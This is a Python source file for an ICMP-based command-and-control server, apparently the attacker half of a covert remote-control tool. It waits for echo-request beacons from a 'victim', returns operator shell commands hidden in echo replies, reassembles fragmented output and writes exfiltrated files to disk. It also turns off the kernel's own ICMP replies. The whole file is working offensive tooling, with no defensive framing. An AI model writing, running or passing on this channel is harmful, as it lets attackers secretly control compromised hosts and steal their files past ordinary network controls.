"""
ICMP C2 Server
"""

from scapy.all import send, sniff, Raw, conf
from scapy.layers.inet import IP, ICMP
import os
import binascii
import threading
import logging
import sys

# Suppress Scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Configuration - can be overridden via command line
VICTIM_IP = None  # Auto-detect from first beacon or set via CLI
LISTEN_INTERFACE = None  # Auto-detect or set via CLI
current_command = ""  # Command to send in next reply
command_lock = threading.Lock()

# Fragment reassembly storage
fragments = {}  # {fragment_id: {1: data, 2: data, ...}}
fragment_metadata = {}  # {fragment_id: {"total": N, "checksum": "xxx"}}


def parse_fragment(payload):
    """Parse fragment protocol and return type and data"""
    if not payload:
        return None, None

    if payload.startswith("SINGLE|"):
        # Single fragment, return complete data
        return "single", payload[7:]

    elif payload.startswith("FRAG|"):
        # Multi-fragment: FRAG|<frag_id>|<current>/<total>|<checksum>|<data>
        try:
            parts = payload.split("|", 4)
            if len(parts) != 5:
                return None, None

            _, frag_id, position, checksum, data = parts
            current, total = map(int, position.split("/"))

            return "fragment", {
                "frag_id": frag_id,
                "current": current,
                "total": total,
                "checksum": checksum,
                "data": data,
            }
        except Exception as e:
            print(f"[!] Error parsing fragment: {e}")
            return None, None

    elif payload.startswith("READY|"):
        # Status beacon
        return "status", payload[6:]

    else:
        # Legacy format or unstructured data
        return "legacy", payload


def reassemble_fragments(frag_id):
    """Attempt to reassemble complete message from fragments"""
    if frag_id not in fragments or frag_id not in fragment_metadata:
        return None

    meta = fragment_metadata[frag_id]
    frags = fragments[frag_id]

    # Check if we have all fragments
    if len(frags) != meta["total"]:
        return None

    # Reassemble in order
    complete_data = ""
    for i in range(1, meta["total"] + 1):
        if i not in frags:
            return None
        complete_data += frags[i]

    # Verify checksum
    import hashlib

    calculated_checksum = hashlib.md5(complete_data.encode()).hexdigest()[:8]
    if calculated_checksum != meta["checksum"]:
        print(
            f"[!] Checksum mismatch for fragment {frag_id}! Expected {meta['checksum']}, got {calculated_checksum}"
        )
        return None

    # Clean up
    del fragments[frag_id]
    del fragment_metadata[frag_id]

    return complete_data


def handle_beacon(pkt):
    """Handle incoming ICMP Echo Request (beacon) from victim"""
    global current_command, VICTIM_IP

    if pkt[ICMP].type == 8:
        # Auto-register victim IP on first beacon
        if VICTIM_IP is None:
            VICTIM_IP = pkt[IP].src
            print(f"\n[!] New victim detected: {VICTIM_IP}")

        # Only process beacons from registered victim(s)
        if pkt[IP].src == VICTIM_IP or VICTIM_IP == "0.0.0.0":  # 0.0.0.0 = accept all
            # Extract output from beacon
            output = ""
            if pkt.haslayer(Raw):
                output = pkt[0][Raw].load.decode(errors="ignore")

            print(f"\n[+] Beacon from {pkt[IP].src} (seq={pkt[ICMP].seq})")

        # Parse fragment protocol
        frag_type, frag_data = parse_fragment(output)

        if frag_type == "single":
            # Complete output in single beacon
            display_output(frag_data)

        elif frag_type == "fragment":
            # Multi-part fragment
            frag_id = frag_data["frag_id"]
            current = frag_data["current"]
            total = frag_data["total"]
            checksum = frag_data["checksum"]
            data = frag_data["data"]

            # Store fragment
            if frag_id not in fragments:
                fragments[frag_id] = {}
                fragment_metadata[frag_id] = {"total": total, "checksum": checksum}

            fragments[frag_id][current] = data

            print(f"[*] Fragment {current}/{total} received (ID: {frag_id})")

            # Try to reassemble
            complete = reassemble_fragments(frag_id)
            if complete:
                print(f"[+] Complete output reassembled ({len(complete)} bytes):")
                display_output(complete)
            else:
                print(
                    f"[*] Waiting for {total - len(fragments.get(frag_id, {}))} more fragment(s)"
                )

        elif frag_type == "status":
            # Status beacon
            status_str = str(frag_data) if frag_data else ""
            if "queue_empty" in status_str:
                print("[*] Status: Victim ready, queue empty")
            elif "fragments_pending" in status_str:
                pending = status_str.split(":")[-1]
                print(f"[*] Status: {pending} fragment(s) pending transmission")
            else:
                print(f"[*] Status: {status_str}")

        elif frag_type == "legacy":
            # Old format or unstructured
            display_output(frag_data)

        # Send reply with command
        with command_lock:
            cmd_to_send = current_command
            current_command = ""  # Clear after sending

        reply = (
            IP(dst=pkt[IP].src)
            / ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
            / cmd_to_send
        )

        # Send on same interface packet arrived on, or default
        try:
            if LISTEN_INTERFACE and LISTEN_INTERFACE != "any":
                send(reply, verbose=False, iface=LISTEN_INTERFACE)
            else:
                send(reply, verbose=False)
        except Exception as e:
            print(f"[!] Error sending reply: {e}")

        if cmd_to_send:
            print(f"[*] Sent command: {cmd_to_send}")
        else:
            print("[*] Sent empty reply (no queued command)")

        print("C&C> ", end="", flush=True)


def display_output(output):
    """Display output with intelligent formatting"""
    # Check if output is hex-encoded file data
    if (
        output
        and len(output) > 100
        and all(c in "0123456789abcdef" for c in output.lower()[:100])
    ):
        try:
            data = binascii.unhexlify(output)
            import time

            filename = f"received_{int(time.time())}.bin"
            with open(filename, "wb") as f:
                f.write(data)
            print(f"[+] File saved as {filename} ({len(data)} bytes)")
            return
        except Exception:
            pass

    # Regular text output
    if len(output) > 1000:
        print(
            f"[+] Output ({len(output)} bytes):\n{output[:1000]}\n...[TRUNCATED FOR DISPLAY]"
        )
        # Save full output to file
        import time

        filename = f"output_{int(time.time())}.txt"
        with open(filename, "w") as f:
            f.write(output)
        print(f"[*] Full output saved to {filename}")
    else:
        print(f"[+] Output:\n{output}")


def get_default_interface():
    """Get the default network interface"""
    try:
        # Use Scapy's default interface
        if conf.iface and conf.iface != "lo":
            return conf.iface

        # Fallback: try to get interface with default route
        try:
            import netifaces

            gws = netifaces.gateways()
            return gws["default"][netifaces.AF_INET][1]
        except (ImportError, KeyError):
            pass

        # Last resort: return None to use all interfaces
        return None
    except Exception:
        return None


def disable_kernel_icmp_replies():
    """Attempt to disable kernel ICMP replies (Linux only)"""
    if os.name != "posix":
        print("[*] Not on Linux, skipping kernel ICMP suppression")
        return

    try:
        # Check if running as root
        if os.geteuid() != 0:
            print(
                "[!] Warning: Not running as root. Kernel ICMP replies may interfere."
            )
            print("[!] Run with 'sudo' for best results.")
            return

        # Disable kernel ICMP replies
        os.system("echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all 2>/dev/null")
        print("[*] Kernel ICMP replies disabled")
    except Exception as e:
        print(f"[!] Could not disable kernel ICMP replies: {e}")


def beacon_listener():
    """Listen for victim beacons in background thread"""
    global LISTEN_INTERFACE

    # Auto-detect interface if not specified
    if LISTEN_INTERFACE is None:
        LISTEN_INTERFACE = get_default_interface()
        if LISTEN_INTERFACE:
            print(f"[*] Auto-detected interface: {LISTEN_INTERFACE}")
        else:
            LISTEN_INTERFACE = "any"
            print("[*] Using all interfaces")

    if VICTIM_IP:
        print(
            f"[*] Listening for beacons from {VICTIM_IP} on interface {LISTEN_INTERFACE}..."
        )
        filter_str = f"icmp and src host {VICTIM_IP}"
    else:
        print(
            f"[*] Listening for beacons from ANY victim on interface {LISTEN_INTERFACE}..."
        )
        filter_str = "icmp[icmptype] == 8"  # Any ICMP Echo Request

    try:
        # Listen on specified interface or all interfaces
        if LISTEN_INTERFACE == "any" or LISTEN_INTERFACE is None:
            sniff(
                filter=filter_str,
                prn=handle_beacon,
                store=False,
            )
        else:
            sniff(
                filter=filter_str,
                prn=handle_beacon,
                iface=LISTEN_INTERFACE,
                store=False,
            )
    except PermissionError:
        print(
            "\n[!] ERROR: Permission denied. Raw socket access requires root privileges."
        )
        print("[!] Please run with: sudo python3 attacker_icmp.py")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] ERROR: {e}")
        print("[!] Try specifying interface manually: python3 attacker_icmp.py -i eth0")
        sys.exit(1)


def main():
    """Main C2 interface"""
    global current_command, VICTIM_IP, LISTEN_INTERFACE

    # Parse command line arguments
    import argparse

    parser = argparse.ArgumentParser(
        description="ICMP C2 Server - Beacon-based Command & Control"
    )
    parser.add_argument(
        "-v",
        "--victim",
        help="Victim IP address (optional, auto-detect from first beacon)",
        default=None,
    )
    parser.add_argument(
        "-i",
        "--interface",
        help="Network interface to listen on (optional, auto-detect)",
        default=None,
    )
    parser.add_argument(
        "-a", "--accept-all", action="store_true", help="Accept beacons from any IP"
    )
    args = parser.parse_args()

    if args.victim:
        VICTIM_IP = args.victim
    elif args.accept_all:
        VICTIM_IP = "0.0.0.0"  # Special value to accept all

    if args.interface:
        LISTEN_INTERFACE = args.interface

    print("=" * 60)
    print("ICMP C2 Server - Beacon-based Command & Control")
    print("=" * 60)
    if VICTIM_IP and VICTIM_IP != "0.0.0.0":
        print(f"Victim IP: {VICTIM_IP}")
    else:
        print("Victim IP: Auto-detect (waiting for first beacon)")
    print("Commands: ls, cat <file>, send <file>, run <cmd>, or any shell command")
    print("=" * 60)

    # Attempt to disable kernel ICMP replies
    disable_kernel_icmp_replies()

    # Check if running as root
    if os.name == "posix" and os.geteuid() != 0:
        print("\n[!] WARNING: Not running as root!")
        print("[!] Raw socket operations require root privileges.")
        print("[!] Please run: sudo python3 attacker_icmp.py")
        print()

    # Start beacon listener in background
    listener_thread = threading.Thread(target=beacon_listener, daemon=True)
    listener_thread.start()

    # Give listener time to start
    import time

    time.sleep(1)

    # Command input loop
    while True:
        try:
            cmd = input("C&C> ")
            if cmd.lower() in ["exit", "quit"]:
                print("[!] Exiting...")
                break

            if cmd.strip():
                if VICTIM_IP is None:
                    print("[!] No victim connected yet. Waiting for first beacon...")
                    continue

                with command_lock:
                    current_command = cmd
                print("[*] Command queued. Waiting for next beacon...")
        except KeyboardInterrupt:
            print("\n[!] Exiting...")
            break
        except Exception as e:
            print(f"[!] Error: {e}")


if __name__ == "__main__":
    main()
